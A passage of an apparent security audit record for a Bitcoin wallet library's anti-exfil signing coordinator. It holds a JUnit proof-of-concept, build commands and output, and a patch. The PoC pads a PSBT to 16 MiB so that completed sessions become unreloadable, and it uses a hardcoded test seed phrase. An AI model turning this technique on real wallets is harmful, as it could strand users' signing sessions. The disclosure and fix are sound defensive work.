import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");
    private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
    private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;

    @TempDir
    Path temporary;

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    @Test
    void completeAcceptsStateThatSubsequentCoordinatorReadsReject() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] padded = padWithGlobalProprietaryEntry(original, MAX_PSBT_BYTES);
        Keystore keystore = keystore();

        assertEquals(MAX_PSBT_BYTES, padded.length);
        assertArrayEquals(padded, AntiExfilPsbt.parseCanonicalV0(padded).serialize(),
                "The padded PSBT remains canonical after adding ignored global proprietary data");
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(padded, keystore).size(),
                "Padding does not change the signable slot semantics");

        Path session = temporary.resolve("oversized-complete.aexs");
        Path journal = temporary.resolve("oversized-complete.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, padded, keystore,
                AntiExfilNetwork.TESTNET4);

        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        Map<AntiExfilSigningSlot.Identifier, BigInteger> openingSecrets = new LinkedHashMap<>();
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(int i = 0; i < commit.getSlots().size(); i++) {
            AntiExfilSlot slot = commit.getSlots().get(i);
            BigInteger openingSecret = BigInteger.valueOf(10_000L + i);
            openingSecrets.put(identifier(slot), openingSecret);
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), ECKey.fromPrivate(openingSecret).getPubKey(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));

        byte[] revealBytes = coordinator.acceptOpenings(openings);
        AntiExfilMessage reveal = AntiExfilCodec.decode(revealBytes);

        List<AntiExfilSigningSlot> signingSlots = AntiExfilPsbt.enumerateSigningSlots(padded, keystore);
        List<AntiExfilSlot> signatureSlots = new ArrayList<>();
        for(AntiExfilSlot slot : reveal.getSlots()) {
            AntiExfilSigningSlot semanticSlot = signingSlots.stream()
                    .filter(candidate -> candidate.getInputIndex() == slot.getInputIndex()
                            && Arrays.equals(candidate.getSignerPublicKey(), slot.getSignerPublicKey()))
                    .findFirst().orElseThrow();
            byte[] compactSignature = antiExfilSign(slot, privateKeyFor(keystore, semanticSlot), openingSecrets.get(identifier(slot)));
            assertTrue(AntiExfilCrypto.verify(slot.getSignerPublicKey(), slot.getMessageHash(), slot.getHostRandomness(),
                    slot.getOpening(), compactSignature));
            signatureSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, compactSignature));
        }
        byte[] signatures = AntiExfilCodec.encode(new AntiExfilMessage(reveal.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                reveal.getSessionId(), reveal.getPsbtDigest(), signatureSlots));

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertTrue(completion.getSignedPsbt().length > MAX_PSBT_BYTES,
                "Adding partial signatures makes the signed PSBT exceed the per-blob read limit");
        assertEquals(5, completion.getVerifiedSignatures().size(),
                "complete returned an in-memory successful result after durably writing the oversized state");
        assertTrue(Files.size(session) > MAX_STATE_BYTES,
                "The durable state now exceeds the aggregate read limit because it stores both original and signed PSBTs");

        AntiExfilException reloadFailure = assertThrows(AntiExfilException.class,
                () -> AntiExfilCoordinator.load(session, journal, keystore));
        assertEquals(AntiExfilException.Code.STATE_INVALID, reloadFailure.getCode());

        AntiExfilException getterFailure = assertThrows(AntiExfilException.class, coordinator::getCompletedResult);
        assertEquals(AntiExfilException.Code.STATE_INVALID, getterFailure.getCode());
    }

    private static byte[] antiExfilSign(AntiExfilSlot slot, ECKey privateKey, BigInteger openingSecret) {
        BigInteger n = ECKey.CURVE.getN();
        byte[] tweakHash = Utils.taggedHash("s2c/ecdsa/point", Utils.concat(slot.getOpening(), slot.getHostRandomness()));
        BigInteger tweak = new BigInteger(1, tweakHash);
        if(tweak.compareTo(n) >= 0) throw new IllegalStateException("unusable anti-exfil tweak");
        BigInteger nonce = openingSecret.add(tweak).mod(n);
        if(nonce.signum() == 0) throw new IllegalStateException("zero anti-exfil nonce");
        BigInteger r = ECKey.CURVE.getG().multiply(nonce).normalize().getAffineXCoord().toBigInteger().mod(n);
        BigInteger e = new BigInteger(1, slot.getMessageHash());
        BigInteger s = nonce.modInverse(n).multiply(e.add(r.multiply(privateKey.getPrivKey()))).mod(n);
        if(s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) s = n.subtract(s);
        if(r.signum() <= 0 || s.signum() <= 0) throw new IllegalStateException("invalid ECDSA scalar");
        return Utils.concat(Utils.bigIntegerToBytes(r, 32), Utils.bigIntegerToBytes(s, 32));
    }

    private static ECKey privateKeyFor(Keystore keystore, AntiExfilSigningSlot slot) throws Exception {
        ECKey key = keystore.getExtendedMasterPrivateKey().getKey(slot.getKeyDerivation().getDerivation());
        assertArrayEquals(slot.getSignerPublicKey(), key.getPubKey());
        return key;
    }

    private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
        return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
    }

    private static byte[] padWithGlobalProprietaryEntry(byte[] original, int targetLength) {
        int globalSeparator = findGlobalSeparator(original);
        byte[] key = new byte[] {(byte)0xfc, 'p', 'o', 'c', '1'};
        int dataLength = targetLength - original.length - compactSizeLength(key.length) - key.length - 5;
        if(dataLength <= 0 || compactSizeLength(dataLength) != 5) throw new IllegalArgumentException("target does not leave room for a large proprietary value");

        ByteArrayOutputStream out = new ByteArrayOutputStream(targetLength);
        out.writeBytes(Arrays.copyOfRange(original, 0, globalSeparator));
        out.writeBytes(PSBTEntry.writeCompactInt(key.length));
        out.writeBytes(key);
        out.writeBytes(PSBTEntry.writeCompactInt(dataLength));
        out.writeBytes(new byte[dataLength]);
        out.writeBytes(Arrays.copyOfRange(original, globalSeparator, original.length));
        byte[] padded = out.toByteArray();
        if(padded.length != targetLength) throw new IllegalStateException("incorrect padded PSBT length");
        return padded;
    }

    private static int findGlobalSeparator(byte[] psbt) {
        int[] offset = {5};
        while(offset[0] < psbt.length) {
            int keyLengthOffset = offset[0];
            long keyLength = readCompactSize(psbt, offset);
            if(keyLength == 0) return keyLengthOffset;
            offset[0] += Math.toIntExact(keyLength);
            long dataLength = readCompactSize(psbt, offset);
            offset[0] += Math.toIntExact(dataLength);
        }
        throw new IllegalArgumentException("PSBT has no global separator");
    }

    private static long readCompactSize(byte[] bytes, int[] offset) {
        int first = Byte.toUnsignedInt(bytes[offset[0]++]);
        if(first < 0xfd) return first;
        if(first == 0xfd) {
            long value = Byte.toUnsignedLong(bytes[offset[0]]) | (Byte.toUnsignedLong(bytes[offset[0] + 1]) << 8);
            offset[0] += 2;
            return value;
        }
        if(first == 0xfe) {
            long value = Integer.toUnsignedLong(ByteBuffer.wrap(bytes, offset[0], 4).order(ByteOrder.LITTLE_ENDIAN).getInt());
            offset[0] += 4;
            return value;
        }
        throw new IllegalArgumentException("test PSBT compact-size value is too large");
    }

    private static int compactSizeLength(long value) {
        if(value < 0xfd) return 1;
        if(value < 0x10000L) return 3;
        return 5;
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 8 lines & 0.3916015625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 32s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; JUnit XML reports 2 tests, 0 skipped, 0 failures. The exploit test uses the existing semantic PSBT fixture, pads it to exactly 16 MiB with canonical global proprietary PSBT data, drives public `AntiExfilCoordinator.create -> acceptOpenings -> complete`, generates valid anti-exfil signer responses in-test from the fixture keystore private keys, and asserts successful completion followed by unreloadable/getter-rejected durable state. It does not model an external hardware signer process; signer behavior is represented by equivalent valid protocol messages sent to the public coordinator APIs.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Coordinator-state encoding now rejects signed PSBTs that its decoder cannot read and rejects aggregate bodies whose checksummed durable file would exceed the read cap, before atomic replacement. Oversized completion therefore preserves the reloadable OPENINGS_ACCEPTED state instead of reporting unrecoverable success.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,457 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
-        return bytes.toByteArray();
+        byte[] body = bytes.toByteArray();
+        if(state.signedPsbt != null && state.signedPsbt.length > MAX_BLOB_BYTES) {
+            throw new IOException("Signed PSBT length is outside limits");
+        }
+        if(body.length > MAX_STATE_BYTES - 32) {
+            throw new IOException("Coordinator state length is outside limits");
+        }
+        return body;
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
